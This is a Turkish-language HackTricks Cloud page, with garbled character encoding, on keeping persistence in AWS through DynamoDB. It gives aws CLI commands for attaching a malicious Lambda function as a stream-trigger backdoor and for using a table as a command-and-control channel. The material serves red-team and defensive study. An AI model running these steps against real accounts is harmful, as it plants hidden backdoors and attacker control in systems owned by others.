# AWS - DynamoDB Persistence

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

### DynamoDB

Daha fazla bilgi iÃ§in eriÅŸim saÄŸlayÄ±n:

{% content-ref url="https://github.com/carlospolop/hacktricks-cloud/blob/tr/pentesting-cloud/aws-security/aws-hizmetleri/aws-veritabanlar%C4%B1/aws-dynamodb-enum.md" %}
[https://github.com/carlospolop/hacktricks-cloud/blob/tr/pentesting-cloud/aws-security/aws-hizmetleri/aws-veritabanlarÄ±/aws-dynamodb-enum.md](https://github.com/carlospolop/hacktricks-cloud/blob/tr/pentesting-cloud/aws-security/aws-hizmetleri/aws-veritabanlar%C4%B1/aws-dynamodb-enum.md)
{% endcontent-ref %}

### Lambda Arka KapÄ± ile DynamoDB Tetikleyicileri

DynamoDB tetikleyicilerini kullanarak, saldÄ±rgan bir tabloya kÃ¶tÃ¼ niyetli bir Lambda iÅŸlevi atayarak **gizli bir arka kapÄ±** oluÅŸturabilir. Lambda iÅŸlevi, bir Ã¶ÄŸe eklenir, deÄŸiÅŸtirilir veya silindiÄŸinde tetiklenebilir, bu da saldÄ±rganÄ±n AWS hesabÄ± iÃ§inde keyfi kodu yÃ¼rÃ¼tmesine olanak tanÄ±r.

{% code overflow="wrap" %}
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
{% endcode %}

KalÄ±cÄ±lÄ±ÄŸÄ± sÃ¼rdÃ¼rmek iÃ§in saldÄ±rgan, DynamoDB tablosunda Ã¶ÄŸeler oluÅŸturabilir veya deÄŸiÅŸtirebilir, bu da kÃ¶tÃ¼ niyetli Lambda iÅŸlevini tetikler. Bu, saldÄ±rganÄ±n Lambda iÅŸleviyle doÄŸrudan etkileÅŸim olmaksÄ±zÄ±n AWS hesabÄ± iÃ§inde kodu yÃ¼rÃ¼tmesine olanak tanÄ±r.

### DynamoDB Bir C2 KanalÄ± Olarak

Bir saldÄ±rgan, komutlarÄ± iÃ§eren Ã¶ÄŸeler oluÅŸturarak ve bu komutlarÄ± almak ve yÃ¼rÃ¼tmek iÃ§in etkilenmiÅŸ Ã¶rnekler veya Lambda iÅŸlevleri kullanarak DynamoDB tablosunu bir **komut ve kontrol (C2) kanalÄ±** olarak kullanabilir.

```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```

Kompromize edilen Ã¶rnekler veya Lambda fonksiyonlarÄ±, yeni komutlarÄ± kontrol etmek iÃ§in C2 tablosunu periyodik olarak kontrol edebilir, bunlarÄ± gerÃ§ekleÅŸtirebilir ve isteÄŸe baÄŸlÄ± olarak sonuÃ§larÄ± tabloya rapor edebilir. Bu, saldÄ±rganÄ±n kompromize edilen kaynaklar Ã¼zerinde sÃ¼reklilik ve kontrol saÄŸlamasÄ±nÄ± saÄŸlar.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
